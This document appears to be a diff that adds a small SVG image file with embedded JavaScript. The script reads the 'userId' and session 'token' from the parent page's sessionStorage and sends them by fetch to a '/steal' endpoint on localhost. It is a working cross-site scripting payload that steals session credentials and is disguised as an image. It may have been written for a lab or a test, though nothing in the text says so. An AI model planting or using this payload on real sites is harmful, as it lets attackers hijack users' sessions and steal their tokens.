@@ -1,0 +1,8 @@
+<svg xmlns="http://www.w3.org/2000/svg">
+  <script><![CDATA[
+    var userId = window.parent.sessionStorage.getItem("userId");
+    var token = window.parent.sessionStorage.getItem("token");
+    var data = "userId=" + userId + "&token=" + token;
+    fetch("http://localhost:9999/steal?" + data);
+  ]]></script>
+</svg>
